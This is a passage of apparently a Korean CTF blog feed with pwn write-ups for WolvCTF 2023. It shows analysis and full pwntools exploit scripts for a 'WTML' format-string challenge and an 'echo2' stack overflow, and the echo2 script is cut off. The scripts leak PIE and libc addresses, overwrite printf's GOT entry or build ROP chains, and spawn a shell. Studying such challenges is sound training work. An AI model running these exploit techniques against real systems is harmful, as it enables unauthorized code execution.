class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v2</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DEBUG] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO implement</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please provide feedback about v2: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> response[<span class="number">0x100</span>];</span><br><span class="line">    fgets(response, <span class="keyword">sizeof</span>(response), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your respones: \&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(response);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\&quot; has been noted!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prompt_tag</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(message);</span><br><span class="line">    *tag = (<span class="type">char</span>) getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> || *tag == <span class="string">&#x27;&lt;&#x27;</span> || *tag == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    tag_replacer replacer = &#123;</span><br><span class="line">            .funcs = &#123;replace_tag_v1, replace_tag_v2&#125;,</span><br><span class="line">            .id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> user_message[MESSAGE_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your WTML!&quot;</span>);</span><br><span class="line">    fread(user_message, <span class="keyword">sizeof</span>(<span class="type">char</span>), MESSAGE_LEN, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// Replace tag</span></span><br><span class="line">        <span class="type">char</span> from = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;What tag would you like to replace [q to quit]?&quot;</span>, &amp;from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> to = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;With what new tag?&quot;</span>, &amp;to);</span><br><span class="line"></span><br><span class="line">        replacer.funcs[replacer.id](user_message, from, to);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(user_message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏïÑÎûò Î∂ÄÎ∂ÑÏùÑ Ïú†ÏùòÏûàÍ≤å ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replacer.funcs[replacer.id](user_message, from, to);</span><br></pre></td></tr></table></figure><p><code>replacer.id</code>Îäî 0ÏúºÎ°ú Ï¥àÍ∏∞ÌôîÎêòÏñ¥ÏûàÍ≥†, Î∞îÎ°ú ÏûÖÎ†•Ìï† Ïàò ÏûàÎäî Î∂ÄÎ∂ÑÏù¥ ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê Í≤âÏúºÎ°ú Î≥¥Í∏∞Ïóî <code>replace_tag_v1</code> Ìï®ÏàòÎßå Í≥ÑÏÜç Ïã§ÌñâÎêúÎã§. ÌïòÏßÄÎßå <code>replace_tag_v2</code>ÏóêÏÑú FSBÍ∞Ä Î∞úÏÉùÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Ï†Ä Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÏºúÏïºÌïòÎäîÎç∞ Ï†Ä Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Î†§Î©¥ <code>replacer.id</code>Î•º 1Î°ú ÏÑ∏ÌåÖÌï¥ÏïºÌïúÎã§. ÌïòÏßÄÎßå Ïù¥Í±∏ Ïñ¥ÎñªÍ≤å ÏÑ∏ÌåÖÌï¥Ïïº Ìï†Íπå? <code>main</code> Ìï®ÏàòÏóêÏÑú ÌùêÎ¶ÑÏùÑ Î∞îÍøÄ Ï∑®ÏïΩÏ†êÏù¥ Î≥¥Ïù¥ÏßÄ ÏïäÎäîÎã§.</p><p><code>replace_tag_v1</code> Ìï®ÏàòÎäî Î¨¥Ï°∞Í±¥ Ïã§ÌñâÎêòÎãàÍπå Ïù¥ Ìï®ÏàòÏóêÏÑú Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÏÑú <code>replace_tag_v2</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÏºú FSBÎ•º Ìä∏Î¶¨Í±∞ÌïòÎäî Î∞©Ìñ•ÏúºÎ°ú ÏÉùÍ∞ÅÌï¥Ïïº ÌïúÎã§.</p><p><code>replace_tag_v1</code> Ìï®ÏàòÎßå ÎñºÏñ¥ÎÜìÍ≥† Î∂ÑÏÑùÌï¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MESSAGE_LEN</code>ÏùÄ 0x20ÏúºÎ°ú Í≥†Ï†ïÎêòÏñ¥ ÏûàÎã§. Ï∞∏Í≥†Î°ú <code>meesage</code>, <code>from</code>, <code>to</code> Î™®Îëê ÏûÖÎ†•Í∞íÏù¥Îã§. Ï≤´ Î≤àÏß∏ Î∞òÎ≥µÎ¨∏ÏóêÏÑú <code>start_tag_index</code>Îäî <code>&lt;[from]&gt;</code>Ïù¥ ÎÇòÏò§Îäî, Ï¶â <code>&lt;</code>Ïùò Ïù∏Îç±Ïä§Î•º ÏùòÎØ∏ÌïúÎã§. Î∞òÎ≥µÎ¨∏ÏùÑ Î≥º ÎñÑÎäî Ìï≠ÏÉÅ Î∞òÎ≥µÎ¨∏ Ï°∞Í±¥Ïùò Ïù∏Îç±Ïä§ Î≤îÏúÑÍ∞Ä Î∞òÎ≥µÎ¨∏ ÎÇ¥Î∂ÄÏóêÏÑú ÏÇ¨Ïö©ÌïòÎäî Ïù∏Îç±Ïä§ Î≤îÏúÑÎ•º ÎÑòÏñ¥Í∞ÄÏßÄ ÏïäÎäîÏßÄ Ìï≠ÏÉÅ Ï£ºÏãúÎ•º Ìï¥ÏïºÌïúÎã§.</p><p>Îëê Î≤àÏß∏ Î∞òÎ≥µÎ¨∏ÏóêÏÑúÎäî <code>start_tag_index+3</code>, Ï¶â <code>&lt;[from]&gt;</code> Îã§Ïùå Ïù∏Îç±Ïä§Î∂ÄÌÑ∞ ÏÇ¨Ïö©ÌïúÎã§. Î¨∏Ï†úÎäî Ïù∏Îç±Ïä§Í∞Ä <code>MESSAGE_LEN-1</code> Ïùº Îïå <code>message[i+2]</code>Ïóê Ï†ëÍ∑ºÌïúÎã§. OOBÍ∞Ä Î∞úÏÉùÌïúÎã§. ÏÇ¨Ïã§ Ïù¥Í±∞Î≥¥Îã§ Îçî Ï§ëÏöîÌïúÍ±¥ <code>message[end_tag_index + 2] = to;</code> Ïù¥ Íµ¨Î¨∏Ïù¥Îã§. Ï†ëÍ∑ºÌï®ÏóêÎèÑ Î™®ÏûêÎùº Í∞íÏùÑ Ïì∞Í≥† ÏûàÎã§! Ï†ïÌôïÌïú ÎîîÎ≤ÑÍπÖÏùÑ ÌÜµÌï¥ Ï†Ä Î∂ÄÎ∂ÑÏù¥ <code>replacer.id</code>ÎùºÎ©¥ 1Î°ú ÏÑ∏ÌåÖÌï¥Ï§Ñ Ïàò ÏûàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>FSBÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÏúºÎ©¥ ÏùµÏä§ÌîåÎ°úÏûáÏùÄ Í∞ÑÎã®ÌïòÎã§. <code>pie base</code>ÏôÄ <code>libc base</code>Î•º Íµ¨Ìïú Îã§ÏùåÏóê <code>printf@got</code>Î•º <code>system</code>ÏúºÎ°ú ÎçÆÍ≥† ÏûÖÎ†•ÏùÑ Ï°∞Ï†àÌï† Ïàò ÏûàÏúºÎØÄÎ°ú <code>/bin/sh\x00</code>Î•º Î≥¥ÎÇ¥Î©¥ ÎÅùÏù¥Îã§!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;wtml.wolvctf.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;ccccccccccccccccccccccccccc&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;/&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;WTML!\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1)</span></span><br><span class="line"><span class="comment"># pie  24 -0x3520</span></span><br><span class="line"><span class="comment"># libc 13 -0x8ee8d</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$p_%24$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x8ee8d</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x3520</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">8</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Your respones: \&quot;&quot; =&gt; /bin/sh</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;0ff_by_0ne_@nd_y0ure_d0ne!!11!!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - echo2 (pwn, bof)</title>
      <link href="/230322-wolvctf2023-echo2/"/>
      <url>/230322-wolvctf2023-echo2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>New and improved echo?<br><code>nc echotwo.wolvctf-2023.kctf.cloud 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏïÑÏâΩÍ≤åÎèÑ Ïù¥ Î¨∏Ï†úÎäî ÏÜåÏä§ÏΩîÎìúÍ∞Ä ÏóÜÎã§. IDAÎ°ú Ïó¥Ïã¨Ïù¥ Ïó¥Ïñ¥ÏÑú Î∂ÑÏÑùÌï¥Î¥§Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">echo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+108h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Echo2&quot;</span>);</span><br><span class="line">  v3 = __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Echo2: %s\n&quot;</span>, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏûÖÎ†•Í∞í ÌÅ¨Í∏∞Î•º ÏßÅÏ†ë Ï°∞Ï†àÌï† Ïàò ÏûàÎã§. Í∞ÄÎøêÌûà BOFÍ∞Ä Î∞úÏÉùÌïúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>pieÍ∞Ä Í±∏Î†§ÏûàÎäîÎç∞ Ïñ¥ÎñªÍ≤å Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÍ≥† Îã§Ïãú <code>main</code>ÏùÑ Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÏùÑÍπå? 1.5Î∞îÏù¥Ìä∏Í∞Ä ÏùºÏ†ïÌïúÎç∞ 0.5Î∞îÏù¥Ìä∏Í∞Ä 2ÏòÄÍ∏∞ ÎïåÎ¨∏Ïóê ÏïÑÎûò <code>\x47</code>, <code>\x4b</code>, <code>\x4c</code> Î•º Ï∞çÏñ¥Í∞ÄÎ©∞ „Öé„Öé.. <code>main</code>ÏúºÎ°ú Ïù¥ÎèôÏãúÌÇ§Î†§Í≥† ÎÖ∏Î†•ÌñàÎã§. stack alignÏù¥ ÏïàÎßûÏïÑÏÑú <code>\x4c</code>ÏúºÎ°ú Ïù¥ÎèôÌñàÎã§.</p><img src="/images/230322-wolvctf2023-echo2/Screenshot 2023-03-29 at 17.52.51.png" width=600/><br><p>pieÍ∞Ä Í±∏Î†§ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê leakÏùÑ Ìï¥Ï§òÏïº ÌïúÎã§. <code>pop rdi</code>Í∞Ä Î∞îÏù¥ÎÑàÎ¶¨Ïóê ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê libcÎ•º leakÌï¥Ïïº Ìï† Îïå ÏïΩÍ∞Ñ Í≥†ÎØºÌñàÎäîÎç∞ Îã§Ïùå Î™ÖÎ†πÏñ¥Î•º Ïã§ÌñâÌï† Îïå Î†àÏßÄÏä§ÌÑ∞Í∞Ä ÏïÑÎûòÏôÄ Í∞ôÏïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>rdi</code>Î•º Í±¥ÎìúÎ¶¥ ÌïÑÏöîÍ∞Ä ÏóÜÏñ¥Ï°åÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rdi   : 0x007ffdd808f940  ‚Üí  0x007ff4dec620d0  ‚Üí  &lt;funlockfile+0&gt; endbr64</span><br></pre></td></tr></table></figure><p>Î∞îÎ°ú <code>printf</code>Î•º Ïã§ÌñâÌï¥Ï£ºÍ≥† <code>main</code>ÏúºÎ°ú ÎèåÎ†§Ï§Ä Îã§Ïùå libcÏùò <code>pop rdi</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>system(&#39;/bin/sh&#39;)</code>Î•º Ïã§ÌñâÌï¥Ï£ºÎ©¥ ÎêúÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;echotwo.wolvctf-2023.kctf.cloud&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4c&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">pie_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">e.address = pie_leak - <span class="number">0x124C</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># no pop rdi</span></span><br><span class="line"><span class="comment"># no libc address in stack</span></span><br><span class="line"><span class="comment"># $rdi   : 0x007ffdd808f940  ‚Üí  0x007ff4dec620d0  ‚Üí  &lt;funlockfile+0&gt; endbr64</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x620d0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span 